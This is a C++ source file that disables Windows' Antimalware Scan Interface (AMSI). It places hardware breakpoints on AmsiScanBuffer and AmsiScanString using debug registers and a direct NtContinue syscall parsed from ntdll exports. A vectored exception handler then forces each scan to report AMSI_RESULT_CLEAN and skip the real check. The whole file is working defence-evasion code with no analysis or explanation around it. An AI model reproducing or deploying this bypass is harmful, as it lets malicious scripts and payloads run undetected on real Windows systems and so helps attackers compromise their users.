#include "amsi_bypass.hpp"
#include "../core/asm/asm_functions.h"
#include "../core/pe_peb_parser.hpp"
#include <atomic>
#include <cstddef>
#include <memoryapi.h>
#include <minwinbase.h>
#include <vector>
#include <windows.h>
#include <winnt.h>

namespace {
fnamsiscanbuffer g_amsiscanbuffer = NULL;
fnamsiscanstring g_amsiscanstring = NULL;
PVOID g_vehhandle = NULL;
std::atomic<BOOL> g_running{TRUE};
std::atomic<LONG> g_haveamsibuf{0};
std::atomic<LONG> g_haveamsistring{0};
} // namespace

static BOOL is_valid_ptr(PVOID p) {
  if (!p)
    return FALSE;
  MEMORY_BASIC_INFORMATION mbi;
  if (VirtualQuery(p, &mbi, sizeof(mbi)) == 0)
    return FALSE;
  if (mbi.State != MEM_COMMIT)
    return FALSE;

  const DWORD writeRights = PAGE_READWRITE | PAGE_WRITECOPY |
                            PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY;
  if (!(mbi.Protect & writeRights))
    return FALSE;

  return TRUE;
}

BOOL set_hwbp_on_thread(std::vector<VX_TABLE_ENTRY> &vx) {
  if (!g_amsiscanbuffer && !g_amsiscanstring) {
    return FALSE;
  }
  if (vx.empty() || !vx[0].pAddress) {
    return FALSE;
  }

  CONTEXT ctx;
  ZeroMemory(&ctx, sizeof(ctx));
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

  ctx.Dr0 = 0;
  ctx.Dr1 = 0;
  ctx.Dr2 = 0;
  ctx.Dr3 = 0;
  ctx.Dr7 = 0;

  if (g_amsiscanbuffer) {
    ctx.Dr0 = (DWORD64)(ULONG_PTR)g_amsiscanbuffer;
    ctx.Dr7 |= (1 << 0);
    ctx.Dr7 &= ~((DWORD64)3 << 16);
    ctx.Dr7 &= ~((DWORD64)3 << 18);
  }

  if (g_amsiscanstring) {
    ctx.Dr1 = (DWORD64)(ULONG_PTR)g_amsiscanstring;
    ctx.Dr7 |= (1 << 2);
    ctx.Dr7 &= ~((DWORD64)3 << 20);
    ctx.Dr7 &= ~((DWORD64)3 << 22);
  }

  call_syscall(vx[0].pAddress, (DWORD)vx[0].wSystemCall, (PVOID)&ctx,
               (PVOID)FALSE);
  return TRUE;
}

LONG WINAPI veh(PEXCEPTION_POINTERS ep) {
  if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
    return EXCEPTION_CONTINUE_SEARCH;
  }

  DWORD64 excaddr = (DWORD64)ep->ExceptionRecord->ExceptionAddress;
  PCONTEXT ctx = ep->ContextRecord;
  DWORD64 rsp = ctx->Rsp;

  if (g_amsiscanbuffer && excaddr == (DWORD64)(ULONG_PTR)g_amsiscanbuffer) {
    PVOID pptr = *(PVOID *)(rsp + 0x30);
    if (is_valid_ptr(pptr)) {
      *(DWORD *)pptr = AMSI_RESULT_CLEAN;
    }
    ctx->Rax = 0;
    ctx->Rip = *(DWORD64 *)rsp;
    ctx->Rsp = rsp + 8;
    ctx->Dr6 &= ~0xF;
    g_haveamsibuf.fetch_add(1);
    return EXCEPTION_CONTINUE_EXECUTION;
  }

  if (g_amsiscanstring && excaddr == (DWORD64)(ULONG_PTR)g_amsiscanstring) {
    PVOID pptr = *(PVOID *)(rsp + 0x28);
    if (is_valid_ptr(pptr)) {
      *(DWORD *)pptr = AMSI_RESULT_CLEAN;
    }
    ctx->Rax = 0;
    ctx->Rip = *(DWORD64 *)rsp;
    ctx->Rsp = rsp + 8;
    ctx->Dr6 &= ~0xF;
    g_haveamsistring.fetch_add(1);
    return EXCEPTION_CONTINUE_EXECUTION;
  }

  return EXCEPTION_CONTINUE_SEARCH;
}

VOID amsi_bypass() {
  HMODULE hamsi = GetModuleHandleW(L"amsi.dll");
  if (!hamsi) {
    hamsi = LoadLibraryW(L"amsi.dll");
  }
  if (!hamsi) {
    return;
  }

  g_amsiscanbuffer = (fnamsiscanbuffer)GetProcAddress(hamsi, "AmsiScanBuffer");
  g_amsiscanstring = (fnamsiscanstring)GetProcAddress(hamsi, "AmsiScanString");

  if (!g_amsiscanbuffer && !g_amsiscanstring) {
    return;
  }

  g_vehhandle = AddVectoredExceptionHandler(1, veh);
  if (!g_vehhandle) {
    return;
  }

  std::vector<VX_TABLE_ENTRY> syscall;
  const char *name[] = {"NtContinue"};
  PVOID base = get_base(L"ntdll.dll");
  if (!base) {
    return;
  }

  if (!parse_exports(base, name, 1, syscall)) {
    return;
  }

  set_hwbp_on_thread(syscall);
}
